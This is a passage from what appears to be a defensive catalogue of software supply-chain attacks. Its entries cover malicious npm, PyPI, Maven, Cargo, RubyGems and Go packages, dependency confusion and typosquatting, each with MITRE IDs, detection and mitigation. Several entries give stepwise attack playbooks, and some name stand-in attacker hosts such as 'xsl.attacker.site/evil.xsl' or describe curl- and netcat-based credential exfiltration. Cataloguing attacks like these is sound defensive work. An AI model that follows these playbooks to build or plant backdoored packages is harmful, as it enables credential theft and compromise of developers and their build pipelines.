- **Impact**: Undetectable runtime backdoor
- **Tools**: Gradle, Java, ASM, Bytecode
- **Scenario**: A malicious Gradle plugin uses ASM bytecode manipulation to inject a runtime command execution payload into compiled classes.
- **Attack Steps**: 1. Attacker publishes a Gradle plugin com.defense.secureheaders with documentation claiming to enhance HTTP header security. 2. Plugin includes bytecode modification logic using ASM to rewrite compiled .class files post-compile. 3. It injects a method call like Runtime.getRuntime().exec() into commonly-used classes such as MainApp.class. 4. Payload runs a shell command that initiates a reverse shell or data exfiltration via curl. 5. Since the injection occurs after compilation, source files and Git history appear clean. 6. The modified classes are included in the JAR artifact deployed to production. 7. Attacker activates the backdoor by triggering a specific HTTP route or input sequence.
- **Detection**: Diff compiled class bytecode vs source-based builds
- **Solution**: Enforce reproducible builds and artifact signing
- **Tags**: #gradle #bytecode #javabackdoor

## NPM Postinstall Script Spoofs Browser-based CLI Consent Screen

- **Attack Type**: Malicious Library
- **Target**: Developer desktops
- **Vulnerability**: GUI-based phishing inside install flows
- **MITRE**: T1566.002
- **Impact**: Full repo compromise via OAuth impersonation
- **Tools**: NPM, Node.js, Electron
- **Scenario**: A malicious NPM package uses Electron to render a fake GitHub consent screen, tricking users into authorizing OAuth access.
- **Attack Steps**: 1. Attacker releases gh-cli-auth-lite, claiming to automate GitHub login for CLI tools. 2. Its postinstall script launches an Electron app styled identically to GitHub’s OAuth consent screen. 3. User is prompted to log in with their GitHub credentials and authorize an app. 4. Behind the scenes, the credentials or token are sent to a remote server. 5. The window even mimics GitHub’s real 2FA and redirect behavior for authenticity. 6. User assumes this is part of the setup and grants full repo and organization access. 7. Attacker uses the token for source code access, PR injection, or further CI/CD compromise.
- **Detection**: Alert on unexpected Electron windows in CLI tools
- **Solution**: Disable GUI calls from dev scripts unless trusted
- **Tags**: #npm #electronphish #oauthsteal

## Rust Crate Drops Packet Sniffer via Cargo Build Script

- **Attack Type**: Malicious Library
- **Target**: Linux developer environments
- **Vulnerability**: Native binary dropper via build.rs
- **MITRE**: T1040
- **Impact**: Persistent passive data theft
- **Tools**: Rust, Cargo, build.rs
- **Scenario**: A Rust crate leverages build.rs to compile and persist a packet sniffer binary hidden in /opt.
- **Attack Steps**: 1. Attacker uploads net-analyzer-fast to crates.io with documentation suggesting performance monitoring. 2. Inside build.rs, attacker embeds a C file compiled via cc::Build into a native binary. 3. Binary is written to /opt/netcapd, with elevated permissions if sudo is available. 4. It uses libpcap to passively monitor all outbound DNS and HTTP traffic. 5. A Rust service is created using systemd to run the sniffer in the background at reboot. 6. Collected logs are buffered and exfiltrated to a hardcoded IP every 15 minutes. 7. Developers using the crate gain the features they expect, but also become long-term surveillance targets.
- **Detection**: Detect cc::Build usage and writes outside target/
- **Solution**: Limit system write access from build scripts
- **Tags**: #rust #buildrs #binaryinjection

## VS Code Extension Hijacks Commit Messages via Proxy Shell Script

- **Attack Type**: Extension Supply Chain
- **Target**: Developer laptops
- **Vulnerability**: PATH hijack via Git binary proxy
- **MITRE**: T1557.003
- **Impact**: Invisible commit message harvesting
- **Tools**: VS Code, Git, Bash
- **Scenario**: A VS Code extension proxies git commit calls through a wrapper script that logs commit messages externally.
- **Attack Steps**: 1. Attacker publishes smart-commit-format-pro, advertising auto-formatting for Git messages. 2. During install, it silently replaces git in PATH with a wrapper shell script that logs git commit -m messages. 3. Script stores messages locally and then uploads them every hour to a remote server via curl. 4. The wrapper transparently forwards commands to the real git binary, maintaining normal user behavior. 5. Because the commit hook itself isn't modified, traditional .git/hooks detection won’t catch this. 6. Developers continue committing secrets like API tokens, credentials, or Jira issue links. 7. Attacker aggregates data for lateral access or targeted exploitation.
- **Detection**: Alert on PATH modifications involving common binaries
- **Solution**: Restrict write permissions on development PATH directories
- **Tags**: #vscode #githijack #proxygit

## Maven Package Triggers Remote XSL Deserialization via Static Initializer

- **Attack Type**: Malicious Library
- **Target**: Java backend systems
- **Vulnerability**: Remote XSLT-based deserialization
- **MITRE**: T1059.005
- **Impact**: Instant remote execution at app startup
- **Tools**: Java, Maven, XML, XSLT
- **Scenario**: A Java library loads a remote XSL file in a static initializer and executes embedded deserialization payload.
- **Attack Steps**: 1. Attacker publishes org.utils.xmlenhancer, posing as an XML formatter. 2. A class contains a static block with TransformerFactory.newInstance().newTransformer(new StreamSource(URL)). 3. The remote URL (http://xsl.attacker.site/evil.xsl) contains a crafted XSL that triggers deserialization using known gadget chains. 4. The code is executed as soon as the class is loaded — even without invoking any methods. 5. Application servers that scan for classes (e.g., Spring Boot auto-scans) are exposed just by startup. 6. Deserialized object opens a shell, drops a loader, or triggers command execution. 7. The payload can be rotated remotely by changing the hosted XSL file, allowing post-deployment update flexibility.
- **Detection**: Block class-level network access via firewall or AppSec policy
- **Solution**: Use hardened class loaders and deny remote resource loads
- **Tags**: #maven #xsltattack #remoteclassload

## PyPI Dependency Confusion via Metadata Poisoning in setup.cfg

- **Attack Type**: Dependency Confusion
- **Target**: Python CI pipelines
- **Vulnerability**: Trusting public index over private
- **MITRE**: T1195.001
- **Impact**: CI/CD credential exfiltration
- **Tools**: PyPI, pip, setuptools, setup.cfg
- **Scenario**: An attacker tricks a Python build system by uploading a malicious lookalike package that exploits setup.cfg metadata for post-install payloads.
- **Attack Steps**: 1. Attacker identifies a company using internal Python packages (e.g., corp-crypto-utils) by scanning GitHub Actions logs or Dockerfiles. 2. Creates a PyPI package with the same name and version (e.g., corp-crypto-utils==1.2.3). 3. Modifies setup.cfg to include malicious scripts in entry_points, which execute automatically on install. 4. Uses twine to upload the package to PyPI. 5. Insecure CI/CD workflows (not using --index-url) install this malicious package during a fresh build. 6. Malicious code exfiltrates AWS credentials and .netrc contents via HTTPS to attacker-controlled endpoint. 7. Victims are unaware unless outbound logs or artifacts are inspected.
- **Detection**: Monitor install sources & unusual install hooks
- **Solution**: Pin versions, restrict installs to internal indexes
- **Tags**: #pypi #metadataattack #ci/cd

## GitHub Action Abuse via Public Composite Wrapper Injection

- **Attack Type**: Malicious Library Injection
- **Target**: GitHub CI/CD
- **Vulnerability**: Untrusted composite action source
- **MITRE**: T1195.002
- **Impact**: Workflow compromise & secret theft
- **Tools**: GitHub Actions, Bash, NPM
- **Scenario**: A GitHub Action loads an attacker-controlled wrapper script from a public repo that runs additional malicious steps during CI.
- **Attack Steps**: 1. Attacker forks a popular GitHub Action (e.g., setup-node) and subtly modifies its internal wrapper to include data exfiltration. 2. Publishes it under a similar name like setup-node-v2-safe and updates README to appear legitimate. 3. Victim project unknowingly references this malicious version due to careless copy-pasting. 4. The wrapper intercepts environment variables (GITHUB_TOKEN, NPM_TOKEN) and uploads them silently to a webhook. 5. The CI run succeeds normally, masking any suspicious behavior. 6. Attacker uses the stolen token for repo access, workflow tampering, or secret dumps.
- **Detection**: Monitor access to external actions, track forks used
- **Solution**: Pin to SHA, validate Actions repo owners
- **Tags**: #github #actionspoisoning #tokenleak

## RubyGem Dependency Confusion via Evil Twin Versioning

- **Attack Type**: Malicious Library
- **Target**: Ruby CI pipelines
- **Vulnerability**: Semver resolution hijack
- **MITRE**: T1195
- **Impact**: Secrets exfiltration via install scripts
- **Tools**: RubyGems, CI, Bundler
- **Scenario**: A malicious gem mimics a private gem and exploits semver auto-resolution in CI pipelines to insert higher version number malware.
- **Attack Steps**: 1. Attacker learns of internal gem acme-core-utils used at v1.3.4. 2. Uploads a public acme-core-utils gem to RubyGems.org with version v1.3.5. 3. Includes credential dump logic in extconf.rb or post_install hook. 4. A pipeline relying on ~> 1.3 range resolves the attacker’s version due to lack of source pinning. 5. Malicious gem runs and scrapes environment variables like DB URLs, tokens, etc. 6. Sends data over HTTPS and deletes traces via at_exit.
- **Detection**: Compare gem versions with private registry listings
- **Solution**: Lock gem source and version explicitly
- **Tags**: #rubygems #semverattack #cicd

## Typo-Squatted PyPI Package Spawns Background Listener

- **Attack Type**: Typo-Squatting
- **Target**: Dev machines
- **Vulnerability**: Typo-based code execution
- **MITRE**: T1555
- **Impact**: Persistent local credential harvesting
- **Tools**: pip, PyPI, psutil
- **Scenario**: A mistyped CLI tool from PyPI installs a background TCP listener that captures environment variables and login sessions.
- **Attack Steps**: 1. Attacker registers pybuildear (a typo of pybuilder) on PyPI. 2. Package mirrors CLI structure of real tool and installs without error. 3. On execution, the script silently spawns a daemon that binds to localhost:5555 and logs shell commands. 4. Every terminal session using the tool now leaks runtime env variables (e.g., AWS_SECRET_KEY). 5. Data is saved locally and exfiltrated periodically. 6. Most users don’t notice due to normal-looking tool behavior. 7. Tool persists across reboots using Python’s sitecustomize.py.
- **Detection**: Monitor localhost port listeners & new services
- **Solution**: Use typo-monitoring tools and dependency allowlists
- **Tags**: #pypi #typosquat #envleak

## Maven Artifact Replaced via Dependency Proxy Cache Injection

- **Attack Type**: Malicious Library
- **Target**: Java backend services
- **Vulnerability**: Insecure proxy cache upload
- **MITRE**: T1195.001
- **Impact**: Session theft via manipulated build artifacts
- **Tools**: Maven, JAR, Nexus, Artifactory
- **Scenario**: Attacker injects a backdoored artifact into a cached Maven proxy (e.g., Nexus or Artifactory) by exploiting misconfigured permissions.
- **Attack Steps**: 1. Attacker finds that a company uses a public Maven proxy cache with no authentication for artifact uploads. 2. Uploads a malicious JAR file to the cache with same coordinates as commons-logging:commons-logging:1.2. 3. JAR includes a logger override that sends logs and HTTP headers to attacker’s server. 4. A scheduled build at the company pulls the malicious JAR from the cache. 5. Code executes during app runtime and siphons data from request headers, including session tokens and JWTs. 6. The attacker maintains access by rotating backdoor artifacts with updated payloads.
- **Detection**: Monitor proxy logs for unexpected uploads
- **Solution**: Enforce artifact signing, disable public write access
- **Tags**: #maven #proxycache #tokenleak

## Evading npm audit via Encrypted Payload Blob

- **Attack Type**: Malicious Package
- **Target**: JavaScript CI builds
- **Vulnerability**: Static analysis blind to encrypted blobs
- **MITRE**: T1027.002
- **Impact**: Full remote shell access on build agents
- **Tools**: Crypto-js, npm, VSCode, curl
- **Scenario**: An attacker embeds an AES-encrypted malicious blob within a commonly used utility package that dynamically decrypts at runtime to bypass static npm auditing tools.
- **Attack Steps**: 1. Attacker selects a utility package like string-tools and adds an AES-encrypted binary blob to its assets folder.2. Modifies the main module to include a dynamic decryption routine using crypto-js, but only activates when a specific env var is detected (e.g., CI=true).3. Payload decrypts a reverse shell binary using the secret key hardcoded via obfuscation.4. Publishes to npm under a similar name like string-toolsx and pushes stars via bots.5. CI/CD installs the package; npm audit skips over encrypted blob as it's not in dependency tree.6. On build execution, the blob is decrypted and shell access is launched silently.
- **Detection**: Monitor runtime syscalls during builds
- **Solution**: Block encrypted payloads in builds unless explicitly approved
- **Tags**: npm, audit, obfuscation, crypto-js

## Composer Installer Hijack with Fake HTTPS Certificate

- **Attack Type**: Dependency Confusion
- **Target**: PHP DevOps pipelines
- **Vulnerability**: Trusting insecure mirrors
- **MITRE**: T1195.001
- **Impact**: Leakage of sensitive secrets & SSH keys
- **Tools**: Composer, Burp Suite, mkcert
- **Scenario**: An attacker sets up a fake HTTPS mirror of Packagist using typo-squatting and misconfigured Composer SSL options to serve a malicious package.
- **Attack Steps**: 1. Attacker identifies composer config using secure-http: false via leaked dotfiles.2. Creates a fake packagist.org.evil.com HTTPS mirror with mkcert.3. Pushes malicious clone of corp/logger package to their own repo.4. Victim system, using --repository-url, fetches from this mirror assuming HTTPS is trustworthy.5. Malicious post-install script exfiltrates .env and SSH keys.6. Attacker uses credentials for lateral movement in corp environment.
- **Detection**: Inspect composer configs for custom repos
- **Solution**: Enforce strict certificate pinning and avoid insecure HTTPS
- **Tags**: composer, ssl, mirror, packagist

## Python Typosquat via --trusted-host Docker Misuse

- **Attack Type**: Misconfiguration Exploit
- **Target**: Dockerized Python builds
- **Vulnerability**: Misuse of trusted-host bypass
- **MITRE**: T1609
- **Impact**: MITM package installation & ENV leak
- **Tools**: pip, mitmproxy, Docker
- **Scenario**: Dockerfile includes --trusted-host to bypass SSL check for internal mirror, allowing attacker to MITM install and serve malicious packages.
- **Attack Steps**: 1. Developer Dockerfile adds --trusted-host internal.repo.local to allow corporate installs in airgapped mode.2. Attacker sets up a local DNS resolver to resolve internal.repo.local to malicious MITM proxy.3. Builds a Python package matching the private name internal-utils and includes a backdoored setup.py.4. Developer accidentally builds outside corp VPN — Docker uses attacker’s mirror.5. setup.py executes during install, dumping host info and ENV to attacker's server.6. Attacker gains info for persistence or further pivoting.
- **Detection**: Flag all builds using --trusted-host in audit logs
- **Solution**: Enforce strict pip config with internal-only DNS and mirrors
- **Tags**: pip, dockerfile, trusted-host, python

## TypeScript Plugin Infection via prepare Script

- **Attack Type**: Malicious Hook
- **Target**: Developer systems
- **Vulnerability**: Abuse of lifecycle scripts in prepare phase
- **MITRE**: T1059.004
- **Impact**: Credential theft via terminal hijack
- **Tools**: npm, VSCode, Bash
- **Scenario**: A fake TypeScript plugin includes a prepare script that injects a keylogger into the developer's .bashrc or .zshrc on install.
- **Attack Steps**: 1. Attacker creates a fake TS plugin called ts-linter-plus mimicking the popular ts-linter.2. Adds a prepare script that modifies .bashrc to include a read -s loop that logs keystrokes to /tmp/.keys.log.3. Targets developers who install packages globally for CLI tools.4. Once installed, the terminal silently logs all commands.5. Attacker fetches logs via cron-triggered curl payload hidden in the same file.6. Developer credentials are harvested over time without any visible warnings.
- **Detection**: Check for changes in shell dotfiles post install
- **Solution**: Block packages with prepare or postinstall unless verified
- **Tags**: typescript, npm, keylogger, bashrc

## Golang Version Check Backdoor Activation

- **Attack Type**: Malicious Library
- **Target**: Go production services
- **Vulnerability**: Version-dependent logic bomb
- **MITRE**: T1203
- **Impact**: Secrets exfiltration via ENV
- **Tools**: Go Modules, curl, GitHub
- **Scenario**: Attacker embeds malicious code in a Go module that only activates on specific Go versions (e.g., go1.20) to evade automated tests using go1.21.
- **Attack Steps**: 1. Attacker modifies forked version of metrics-go with logic bomb checking runtime.Version().2. Backdoor activates only if Go version is 1.20.x — ensuring test pipelines using newer versions won’t trigger it.3. Module executes curl-based command to exfil ENV when imported in real-world systems.4. Developer installs it via go get github.com/metrics-go/metrics@v1.2.3 without vetting.5. During deployment, production runs on Go 1.20, activating the hidden payload.6. Attacker gains sensitive tokens from ENV or service credentials.
- **Detection**: Check runtime version branching in unfamiliar Go packages
- **Solution**: Pin internal Go module hashes and use proxy.mirror
- **Tags**: golang, versioning, logicbomb, env

## Maven Mirror Injection via Repository Shadowing

- **Attack Type**: Malicious Library
- **Target**: Java applications
- **Vulnerability**: Trusting unverified Maven repos
- **MITRE**: T1553.005
- **Impact**: Remote execution during class load
- **Tools**: Maven, Java, Nexus Repo
- **Scenario**: A malicious actor hosts a Maven repository with higher priority in settings.xml and shadows real dependencies.
- **Attack Steps**: 1. Attacker sets up a public Maven-compatible repository mimicking Maven Central's structure. 2. Inside this fake repo, they host a version of org.springframework:spring-core but inject malicious payloads in a class’s static block. 3. Attacker tricks developers (via README or build scripts) to add this repository before Maven Central in their settings.xml or pom.xml. 4. During build, Maven resolves dependencies from the attacker’s repository due to priority. 5. Malicious code executes during application startup, allowing remote command execution or data exfiltration.
- **Detection**: Monitor unexpected repo usage in builds
- **Solution**: Restrict to whitelisted Maven mirrors and enforce GPG signatures
- **Tags**: #maven #javabuild #repoabuse

## Logging Library Uploads Logs to Pastebin Clone

- **Attack Type**: Data Exfiltration
- **Target**: Production Node.js apps
- **Vulnerability**: Hidden exfil code in logger package
- **MITRE**: T1005
- **Impact**: Leak of PII, secrets, or error messages
- **Tools**: Node.js, npm, Axios
- **Scenario**: A cloned logger package sends logs to a Pastebin-like dump server, bypassing security monitoring systems.
- **Attack Steps**: 1. Attacker publishes a package safe-json-logger on npm, cloned from a known secure logger like winston. 2. They add a subtle HTTP POST call to hxxp://paste-mirror[.]xyz/api inside the log() method. 3. Developer unknowingly adds this logger for JSON logging. 4. At runtime, every log message (including stack traces and credentials) is mirrored to attacker’s endpoint. 5. Logs remain publicly accessible on the fake paste site, evading corporate firewalls. 6. Attacker analyzes logs to find secrets, JWTs, or error traces across companies.
- **Detection**: Monitor outbound HTTP calls from logging modules
- **Solution**: Self-host loggers or use strict EDR alerting on node HTTP calls
- **Tags**: #logleak #npm #nodejs

## GitHub Packages Hosting Internal Clone for Shadowing

- **Attack Type**: Dependency Confusion
- **Target**: GitHub Actions workflows
- **Vulnerability**: Lack of version pinning, public package wins
- **MITRE**: T1195.002
- **Impact**: Secrets theft from CI pipelines
- **Tools**: GitHub CLI, npm, yml CI
- **Scenario**: Malicious internal-utils clone on GitHub Packages mimics internal org tools and targets GitHub Actions builds.
- **Attack Steps**: 1. Attacker creates a GitHub repo with @internal-utils/package-builder, shadowing an internal dependency. 2. They configure the package with high semantic version numbers (e.g., 99.99.99) to force selection. 3. Developer configures a GitHub Action with npm install without strict version pinning or scoped registry. 4. During the CI build, npm pulls the attacker’s GitHub package due to its public availability and higher version. 5. The script in the package extracts repo secrets and pushes them to an attacker-controlled webhook.
- **Detection**: Inspect build logs for unusual package sources
- **Solution**: Always pin versions and restrict to internal registries
- **Tags**: #cicd #npm #githubshadow

## Puppeteer Companion Installs Covert WebSocket Listener

- **Attack Type**: Malicious Library
- **Target**: Dev workstations, browser tests
- **Vulnerability**: Hidden runtime comms via WebSocket
- **MITRE**: T1176
- **Impact**: Browser session data leakage
- **Tools**: Puppeteer, WebSocket
- **Scenario**: A browser automation wrapper package sets up a hidden WebSocket server in the background to monitor activity.
- **Attack Steps**: 1. Attacker creates a package puppeteer-boosted claiming faster screenshot and scraping speeds. 2. During postinstall, the script launches a background Node process that starts a WebSocket listener on a random port. 3. The listener sends screenshot data and DOM snapshots from the headless browser session to the attacker. 4. Devs using this for browser testing on real UAT apps unknowingly leak private UI states and session cookies. 5. Attacker collects data from multiple automation instances for recon or phishing payloads.
- **Detection**: Check background scripts in postinstall of browser libs
- **Solution**: Avoid packages that execute postinstall actions without review
- **Tags**: #puppeteer #automation #spyware

## Chrome Extension Loader in CI Container Exploited

- **Attack Type**: Persistence Mechanism
- **Target**: CI containers using Chrome
- **Vulnerability**: Remote debugging allows unauthorized ext load
- **MITRE**: T1176
- **Impact**: Passive spyware persists in CI browser env
- **Tools**: npm, ChromeDriver, Docker
- **Scenario**: A malicious Node dependency plants a Chrome extension and loads it silently during containerized browser tests.
- **Attack Steps**: 1. Attacker publishes a package named chrome-test-helper, which wraps Puppeteer and adds stealth capabilities. 2. The package contains a .crx Chrome extension and uses the Chrome remote debugging port to load it silently. 3. The extension requests permission to access tabs, cookies, and clipboard data. 4. In Docker-based CI jobs that run UI tests with --no-sandbox, the extension gets loaded and starts tracking activity. 5. Attacker collects sensitive output (password fields, UI tokens) during test runs, potentially across multiple runs and organizations.
- **Detection**: Monitor loaded extensions during test sessions
- **Solution**: Disable remote debugging or use extension whitelists in CI
- **Tags**: #chrome #extension #cicd

## Poisoning Unpublished PyPI Namespace

- **Attack Type**: Dependency Confusion
- **Target**: Developer machines
- **Vulnerability**: Public registration of internal package name
- **MITRE**: T1195.002
- **Impact**: Developer credential theft and lateral movement
- **Tools**: PyPI, Python, pip
- **Scenario**: An attacker registers a package on PyPI using a name that was previously only used internally by an organization.
- **Attack Steps**: 1. Attacker locates leaked or open Dockerfile/requirements.txt from GitHub showing internal package inhouse-tools. 2. Confirms that inhouse-tools does not exist on PyPI. 3. Publishes a new inhouse-tools==1.0.0 package with a seemingly normal interface but a hidden malicious payload. 4. A developer reinstalls dependencies in a fresh environment — pip defaults to PyPI and pulls attacker’s version. 5. Upon installation or first import, package reads .env, ~/.ssh contents, or cloud config files. 6. Attacker receives sensitive credentials and expands access into the organization.
- **Detection**: Alert on unknown package installs; cross-check install URLs
- **Solution**: Claim internal namespaces on public registries proactively
- **Tags**: #pypi #python #dependencyconfusion

## Steganographic Payload in Obfuscated NPM Library

- **Attack Type**: Malicious Libraries
- **Target**: Node.js environments
- **Vulnerability**: Code obfuscation bypasses static tools
- **MITRE**: T1027
- **Impact**: Stealthy RCE or credential exfiltration
- **Tools**: Node.js, Obfuscator.io
- **Scenario**: A JavaScript utility package includes obfuscated payloads using base64 and image steganography to hide malicious behavior.
- **Attack Steps**: 1. Attacker publishes color-palette-plus, claiming extended color functions. 2. Inside the code, attacker hides base64 strings containing an image payload with embedded JavaScript using steganography. 3. Package extracts this image, decodes it, and uses eval() to execute dynamic code. 4. This dynamic payload creates a hidden reverse shell via WebSocket or fetches a second-stage loader. 5. Because of the obfuscation, security tools cannot easily flag it. 6. Developers trust the package due to high stars, downloads, and unit tests.
- **Detection**: Monitor obfuscated code, image-based loaders
- **Solution**: Avoid poorly documented packages; scan for hidden assets and dynamic eval
- **Tags**: #obfuscation #javascript #evasion

## Dockerfile-Induced PyPI Dependency Confusion

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines, containers
- **Vulnerability**: Public Dockerfiles leaking internal deps
- **MITRE**: T1195.002
- **Impact**: CI container backdoor and persistent access
- **Tools**: Docker, PyPI, pip
- **Scenario**: Attacker exploits Dockerfile exposing an unregistered internal Python package and injects malicious code via PyPI.
- **Attack Steps**: 1. Attacker discovers public GitHub repo with Dockerfile showing RUN pip install internal-client. 2. Verifies internal-client doesn’t exist on PyPI. 3. Publishes that package to PyPI with malicious setup.py that sends /root/.aws/ and .env contents to a remote server. 4. Users clone repo and build image, unknowingly pulling attacker’s package. 5. Compromised image is deployed internally or to customers. 6. Attacker now has backdoor access through supply chain poisoning.
- **Detection**: Scan public Dockerfiles for installable secrets
- **Solution**: Avoid using unverified public packages; host private package registry
- **Tags**: #docker #pip #supplychain

## Social Engineering via Fake Package Test Coverage

- **Attack Type**: Malicious Libraries
- **Target**: Frontend apps, internal audits
- **Vulnerability**: Trusting test coverage over actual behavior
- **MITRE**: T1204.002
- **Impact**: Session theft through dependency
- **Tools**: npm, Jest, README badges
- **Scenario**: Malicious actor tricks code reviewers and scanners by bundling high-quality tests and docs to mask harmful functionality.
- **Attack Steps**: 1. Attacker creates form-validator-pro — a package cloned from a real form validation library. 2. They include 100% unit test coverage, badges (Travis, Codecov), and clean documentation. 3. Within index.js, a hidden function activates on require() and sends browser localStorage, clipboard contents, and cookies to remote server. 4. The package is accepted by dev teams due to impressive appearance. 5. Once in production, thousands of sessions are compromised silently. 6. Attacker collects API tokens and session cookies for high-privilege accounts.
- **Detection**: Monitor runtime behavior; analyze network activity
- **Solution**: Don’t trust docs alone; dynamically analyze packages before approval
- **Tags**: #npm #socialengineering #packagereview

## Typosquatting with Decoy Install and Stealth Exfiltration

- **Attack Type**: Dependency Confusion
- **Target**: Developer workstations
- **Vulnerability**: Typosquatting on public registry
- **MITRE**: T1195.002
- **Impact**: Silent cloud credential theft
- **Tools**: Python, pip, PyPI
- **Scenario**: An attacker publishes a misspelled variant of a popular Python library to exploit developer typos and exfiltrate data.
- **Attack Steps**: 1. Attacker notices many people mistype requests as requets. 2. Publishes requets with a setup.py containing hidden code in the install_requires block. 3. When someone runs pip install requets, install hook triggers and grabs .bash_history, AWS credentials, and GCP configs. 4. It also installs real requests silently to avoid suspicion. 5. Developer doesn't notice anything wrong. 6. Meanwhile, attacker gains cloud access and begins probing further into the organization.
- **Detection**: Analyze install scripts; enforce hash/pin policies
- **Solution**: Block install of unknown packages; use dependency allowlists
- **Tags**: #pypi #typosquatting #stealthyattack

## Reclaiming Dormant NPM Package for Payload Delivery

- **Attack Type**: Malicious Libraries
- **Target**: Node.js apps & pipelines
- **Vulnerability**: Takeover of unmaintained packages
- **MITRE**: T1195.002
- **Impact**: Compromise of apps via automated updates
- **Tools**: NPM CLI, WHOIS, Email spoofing
- **Scenario**: A threat actor claims control over an old, unmaintained NPM package and silently pushes malware in a trusted ecosystem.
- **Attack Steps**: 1. Attacker scrapes NPM for packages untouched for years using npm search and filters by last published date. 2. Identifies one where the author's domain is expired. 3. Registers the expired domain and creates matching email (e.g., dev@oldsite.com). 4. Contacts NPM support claiming to be the original author and requests ownership. 5. Once ownership is granted, attacker publishes a new patch release with minimal code change but inserts a malicious postinstall script. 6. Downstream apps automatically update to the new version due to semver rules. 7. On install, it steals .env, SSH keys, and cloud credentials.
- **Detection**: Alert on package ownership changes; check version diffs
- **Solution**: Deprecate & archive unused packages; pin exact versions
- **Tags**: #npm #takeover #dormantpkg

## Internal Package Naming Collision with Public Registry

- **Attack Type**: Dependency Confusion
- **Target**: Developer & CI environments
- **Vulnerability**: Name confusion between internal/public pkg
- **MITRE**: T1195.002
- **Impact**: Misattributed package leads to RCE
- **Tools**: Node.js, NPM, Registry spoofing
- **Scenario**: A developer accidentally installs a public package that shares a name with an internal one, causing execution of rogue code.
- **Attack Steps**: 1. Internal package @corp-tools/auth is used only within the org. 2. Attacker sees GitHub issue referencing it without @. 3. Publishes corp-tools-auth with near-identical API but with added preinstall script. 4. Developer mistypes or omits scope and runs npm install corp-tools-auth. 5. Public version installs, runs script, and installs persistent backdoor. 6. The backdoor exfiltrates /etc/passwd, local shell history, and SSH keys to the attacker. 7. The real internal package is never used, masking the confusion.
- **Detection**: Detect public/private resolution conflicts
- **Solution**: Enforce scoped package naming; monitor registry pulls
- **Tags**: #npm #internalpkg #namespoofing

## Environment-Aware Malicious Python Library in VirtualEnv

- **Attack Type**: Malicious Libraries
- **Target**: Dev Machines (Python)
- **Vulnerability**: Conditional execution in dev/test contexts
- **MITRE**: T1059.006
- **Impact**: Stealthy data theft during safe-looking testing
- **Tools**: PyPI, setup.py, dnspython
- **Scenario**: Malicious Python package checks execution context (virtualenv or not) and exfiltrates secrets only during isolated tests.
- **Attack Steps**: 1. Attacker releases py-data-helpers to PyPI. 2. setup.py includes logic that checks for sys.prefix path typical of virtualenvs. 3. If inside a virtual environment, it silently collects all environment variables and SSH configs. 4. Data is base64-encoded and sent as subdomains of a crafted DNS request. 5. During development, everything appears functional — package behaves as advertised. 6. Dev signs off and integrates it into production. 7. By then, attacker already has access to keys and staging credentials.
- **Detection**: Monitor DNS logs for suspicious dynamic domains
- **Solution**: Run packages in isolated monitored VMs during eval
- **Tags**: #virtualenv #pyenv #setuphooks

## NPM Package with Hidden Executable for Remote Shell Access

- **Attack Type**: Malicious Libraries
- **Target**: Workstations (Node.js devs)
- **Vulnerability**: Executable payloads in npm packages
- **MITRE**: T1204.002
- **Impact**: Persistent shell access via dependency
- **Tools**: NPM, Ghidra, Netcat
- **Scenario**: A malicious binary is hidden in an NPM package and used to open a reverse shell on install, bypassing detection tools.
- **Attack Steps**: 1. Attacker publishes fileops-util, advertising advanced file ops. 2. A compiled binary helper.bin is base64-encoded and extracted by postinstall script. 3. The binary opens port 8484 and connects to attacker C2 using curl/netcat. 4. Developers overlook the binary since the package has proper README and tests. 5. System monitoring doesn't flag it due to non-standard port and stealthy payload. 6. Attacker uses shell to run recon tools and grab system info. 7. The shell is maintained via cron entry dropped silently.
- **Detection**: Scan for binary artifacts in npm packages
- **Solution**: Disallow postinstall; audit for base64 blobs in code
- **Tags**: #nodejs #binarybackdoor #npmsecurity

## Supply Chain Injection via Malicious Script in Forked Repo PR

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD build pipelines
- **Vulnerability**: Lack of script filtering in dependency merges
- **MITRE**: T1059.004
- **Impact**: Build takeover, credential leak
- **Tools**: GitHub, NPM, curl, shell
- **Scenario**: An attacker contributes a PR with a new dependency that contains a backdoored install script, leading to CI compromise.
- **Attack Steps**: 1. Attacker forks a JS project and adds image-resizer-pro as a dependency. 2. That package includes a postinstall script using curl to pull a bash payload. 3. Attacker opens a PR that looks like a feature improvement. 4. Maintainer merges PR without checking scripts or auditing the new dependency. 5. On next CI run (e.g., GitHub Actions), the postinstall triggers and attacker gains shell access. 6. Script installs remote access tools and modifies env variables. 7. CI pipeline is now hijacked and can be abused to compromise builds.
- **Detection**: Block PRs with new packages; run CI with --ignore-scripts
- **Solution**: Require approvals for dependencies; static scan merged manifests
- **Tags**: #cihack #prattack #postinstall

## Metadata Field Exploit in PyPI Package for Credential Exfiltration

- **Attack Type**: Malicious Libraries
- **Target**: Python tooling (docs/builds)
- **Vulnerability**: Code execution from unescaped metadata
- **MITRE**: T1203
- **Impact**: Compromise via package parsing during builds
- **Tools**: PyPI, Sphinx, setuptools
- **Scenario**: A PyPI package abuses metadata fields (e.g., long_description) to execute payloads when documentation tools parse them.
- **Attack Steps**: 1. Attacker publishes cloudlogin-helper with realistic PyPI metadata. 2. setup.py includes base64-encoded Python in long_description. 3. Sphinx documentation generator or pip install with --use-pep517 evaluates the field. 4. Payload writes AWS credentials and .env content to an attacker-controlled Gist via requests. 5. This occurs silently as part of python setup.py build. 6. The developer never runs the actual code, yet secrets are compromised. 7. Attacker uses the Gist link to retrieve sensitive info hours later.
- **Detection**: Detect unsafe code in setup.py or metadata
- **Solution**: Enforce static metadata parsing; audit all install hooks
- **Tags**: #pypi #metadataexploit #docgen

## Transitive Dependency Attack via Indirect NPM Tree Injection

- **Attack Type**: Dependency Confusion
- **Target**: Monorepo CI systems
- **Vulnerability**: Lack of transitive dependency visibility
- **MITRE**: T1195.002
- **Impact**: CI/CD compromise via deep dependency tree
- **Tools**: NPM, Yarn, npq, Monorepo tools
- **Scenario**: Attacker hides malicious code deep in a multi-level dependency chain in a shared monorepo project.
- **Attack Steps**: 1. Attacker uploads a package log-utils that depends on stream-tools, which in turn depends on safe-base, the actual malicious package. 2. safe-base has a postinstall script that uses wget to fetch a remote shell script. 3. The shell script sends system info and secrets to attacker’s webhook. 4. A major enterprise repo includes log-utils in several microservices. 5. Devs only vet direct dependencies, so safe-base is missed. 6. During CI builds, the malicious script executes. 7. Data like environment variables, tokens, and CI secrets are silently exfiltrated.
- **Detection**: Analyze entire dependency graph using yarn list or npm ls
- **Solution**: Flatten and lock dependency trees; audit 3rd-party lib chains
- **Tags**: #transitiveattack #nesteddeps #supplychain

## SemVer Mismatch Exploit to Deliver Malicious Update

